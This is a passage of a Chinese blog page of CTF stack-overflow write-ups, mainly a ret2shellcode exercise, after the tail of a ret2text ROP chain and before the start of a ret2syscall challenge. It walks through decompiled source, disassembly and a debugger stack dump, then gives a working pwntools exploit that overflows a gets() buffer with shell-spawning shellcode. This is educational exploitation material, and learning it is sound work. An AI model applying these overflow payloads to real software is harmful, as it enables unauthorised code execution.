+</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0x4011ac</span>)<span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#填充 pop rbp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 填充 foo ret </span>
+</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0x4011ec</span>) 
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(r.readall())</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="ret2shellcode">ret2shellcode<a hidden class="anchor" aria-hidden="true" href="#ret2shellcode">#</a></h2>
+<h3 id="1-源码分析">1. 源码分析<a hidden class="anchor" aria-hidden="true" href="#1-源码分析">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [sp+1Ch] [bp-64h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;No system for you this time !!!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v4);  <span style="color:#75715e">//栈溢出点 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">strncpy</span>(buf2, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v4, <span style="color:#ae81ff">0x64u</span>); <span style="color:#75715e">//shellcode 复制到Buf2 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;bye bye ~&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这道题是溢出写shellcode int v4是局部变量不会有固定的地址<br>
+strncpy 函数 0x804a080 的地址是buf2 变量的这样V4被复制到Buf2中shellcode就有了一个固定的地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> 8048598:	c7 44 24 08 64 00 00 	mov    DWORD PTR [esp+0x8],0x64
+</span></span><span style="display:flex;"><span> 804859f:	00 
+</span></span><span style="display:flex;"><span> 80485a0:	8d 44 24 1c          	lea    eax,[esp+0x1c]
+</span></span><span style="display:flex;"><span> 80485a4:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+</span></span><span style="display:flex;"><span> 80485a8:	c7 04 24 80 a0 04 08 	mov    DWORD PTR [esp],0x804a080
+</span></span><span style="display:flex;"><span> 80485af:	e8 6c fe ff ff       	call   8048420 &lt;strncpy@plt&gt;
+</span></span></code></pre></div><h3 id="2-构建exp">2. 构建Exp<a hidden class="anchor" aria-hidden="true" href="#2-构建exp">#</a></h3>
+<p>v4 大小是100</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>07:001c│ eax 0xffffd0dc ◂— &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;
+</span></span><span style="display:flex;"><span>... ↓        24 skipped
+</span></span><span style="display:flex;"><span>20:0080│ edx 0xffffd140 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
+</span></span><span style="display:flex;"><span>21:0084│-004 0xffffd144 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
+</span></span><span style="display:flex;"><span>22:0088│ ebp 0xffffd148 ◂— 0x0
+</span></span></code></pre></div><p>可以看到下面两位被got表占了不知道为什么 再填充 8byte 覆盖ebp 再加 4byte</p>
+<p>100 + 8 + 4 = 112 byte</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2shellcode&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raw_input()
+</span></span><span style="display:flex;"><span>sddaddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>print(len(shell))
+</span></span><span style="display:flex;"><span>print(shell<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x70</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)<span style="color:#f92672">+</span>p32(sddaddr))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;!!!&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(shell<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x70</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)<span style="color:#f92672">+</span>p32(sddaddr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()                            
+</span></span></code></pre></div><p>因为不知道shellcode的长度所以使用 ljust函数来填充如果shellcode长度不够就用A来填充</p>
+<h2 id="ret2syscall">ret2syscall<a hidden class="anchor" aria-hidden="true" href="#ret2syscall">#</a></h2>
+<h3 id="11-源码分析">1.1 源码分析<a hidden class="anchor" aria-hidden="true" href="#11-源码分析">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int __cdecl main(int argc, const char **argv, const char **envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  int v4; // [sp+1Ch] [bp-64h]@1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, 0, 2, 0);
+</span></span><span style="display:flex;"><span>  setvbuf(stdin, 0, 1, 0);
+</span></span><span style="display:flex;"><span>  puts(&#34;This time, no system() and NO SHELLCODE!!!&#34;);
+</span></span><span style="display:flex;"><span>  puts(&#34;What do you plan to do?&#34;);
+</span></span><span style="display:flex;"><span>  gets(&amp;v4); 
+</span></span><span style="display:flex;"><span>  return 0; 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+
+        </div>
+
+        <footer class="post-footer">
+            
+<nav class="paginav">
+  <a class="prev" href="http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BAret2text%E5%AF%BB%E6%89%BE%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>栈溢出ret2text寻找溢出长度</span>
+  </a>
+  <a class="next" href="http://guozhi1.github.io/posts/pwn/buuctfrip%E8%A7%A3%E9%A2%98/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>[BUUCTF]rip栈溢出解题</span>
+  </a>
+</nav>
+
+        </footer>
+    </div>
+
+<style>
+    .comments_details summary::marker {
+        font-size: 20px;
+        content: '👉展开评论';
+        color: var(--content);
+    }
+    .comments_details[open] summary::marker{
+        font-size: 20px;
+        content: '👇关闭评论';
+        color: var(--content);
+    }
+</style>
+
+
+<div>
+    <details class="comments_details">
+        <summary style="cursor: pointer; margin: 50px 0 20px 0;width: 130px;">
+            <span style="font-size: 20px;color: var(--content);">...</span>
+        </summary>
+        <div id="tcomment"></div>
+    </details>
+    <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js">
+    </script>
+    <script>
+        twikoo.init({
+            envId:  null ,
+        el: "#tcomment",
+            lang: 'zh-CN',
+            region:  null ,
+        path: window.TWIKOO_MAGIC_PATH||window.location.pathname,
+        })
+    </script>
+</div>
+</article>
+</main>
+
+<footer class="footer">
+    <span>
+        Copyright
+        &copy;
+        -2023
+        <a href="http://guozhi1.github.io" style="color:#939393;">果汁天下苏&#39;s Blog</a>
+        All Rights Reserved
+    </span>
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#939393;"></a>&nbsp;
+    <span>
+        <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null"
+           style="display:inline-block;text-decoration:none;height:20px;color:#939393;">
+            <img src="" style="float:left;margin: 0px 5px 0px 0px;"/>
+            
+        </a>
+    </span>
+    <span id="busuanzi_container">
+        <span class="fa fa-user"></span> <span id="busuanzi_value_site_uv"></span>
+        <span class="fa fa-eye"></span> <span id="busuanzi_value_site_pv"></span>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z"/>
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    document.addEventListener('scroll', function (e) {
+        const readProgress = document.getElementById("read_progress");
+        const scrollHeight = document.documentElement.scrollHeight;
+        const clientHeight = document.documentElement.clientHeight;
+        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+        readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
+    })
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    let mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        (function() {
+            document.cookie = "change-themes" + "="+ escape ("false");
+        })()
+
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script>
+
+<script>
+    document.body.addEventListener('copy', function (e) {
+        if (window.getSelection().toString() && window.getSelection().toString().length > 50) {
+            let clipboardData = e.clipboardData || window.clipboardData;
+            if (clipboardData) {
+                e.preventDefault();
+                let htmlData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"果汁天下苏's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                let textData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"果汁天下苏's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                clipboardData.setData('text/html', htmlData);
+                clipboardData.setData('text/plain', textData);
+            }
+        }
+    });
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = '📄复制';
+
+        function copyingDone() {
+            copybutton.innerText = '👌🏻已复制!';
+            setTimeout(() => {
+                copybutton.innerText = '📄复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                let text = codeblock.textContent +
+                    '\r\n————————————————\r\n' +
+                    '版权声明：本文为「'+"果汁天下苏's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                navigator.clipboard.writeText(text);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) {}
+            selection.removeRange(range);
+        });
+
+        let language = codeblock.className.replaceAll("language-", "")
+        let macTool = document.createElement("div")
+        let macTool1 = document.createElement("div")
+        let macTool2 = document.createElement("div")
+        let macTool3 = document.createElement("div")
+        let languageType = document.createElement("div")
+        languageType.innerText = language
+        macTool.setAttribute('class', 'mac-tool')
+        macTool1.setAttribute('class', 'mac bb1')
+        macTool2.setAttribute('class', 'mac bb2')
+        macTool3.setAttribute('class', 'mac bb3')
+        languageType.setAttribute('class', 'language-type')
+        macTool.appendChild(macTool1)
+        macTool.appendChild(macTool2)
+        macTool.appendChild(macTool3)
+        macTool.appendChild(languageType)
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        }
+    });
+</script>
+
+<script>
+    $("code[class^=language] ").on("mouseover", function () {
+        if (this.clientWidth < this.scrollWidth) {
+            $(this).css("width", "135%")
+            $(this).css("border-top-right-radius", "var(--radius)")
+        }
+    }).on("mouseout", function () {
+        $(this).css("width", "100%")
+        $(this).css("border-top-right-radius", "unset")
+    })
+</script>
+</body>
+
+</html>
